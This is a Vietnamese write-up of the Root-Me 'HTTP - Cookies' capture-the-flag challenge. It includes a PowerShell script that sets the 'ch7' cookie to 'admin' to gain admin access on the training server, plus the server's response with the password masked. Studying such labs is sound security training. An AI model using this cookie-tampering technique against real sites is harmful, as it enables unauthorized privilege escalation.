# HTTP - Cookies

## Solution

Có thể làm challenge này hoàn toàn trên Windows với Powershell

Khi vào trang web, có một liên kết có tên là "Saved email addresses" và khi click vào liên kết này, có thể thấy một cookie có tên là `ch7` với giá trị `visiteur`.

Giải pháp rất dễ, cần gửi một cookie có giá trị là `admin`.

Script để lấy password trong Powershell: 

```
# Session Object
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
# Cookie Object
$cookie = New-Object System.Net.Cookie

# Set the cookie name
$cookie.Name = "ch7"
# Set the cookie value
$cookie.Value = "admin"
# Set the cookie domain
$cookie.Domain = "challenge01.root-me.org"

# Add the cookie on the session
$session.Cookies.Add($cookie)

(Invoke-WebRequest "http://challenge01.root-me.org/web-serveur/ch7" -WebSession $session).RawContent
```

Và có password!

```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Date: Mon, 31 Dec 2018 01:03:56 GMT
Server: nginx

<div>Validation password : ****</div></fieldset>
```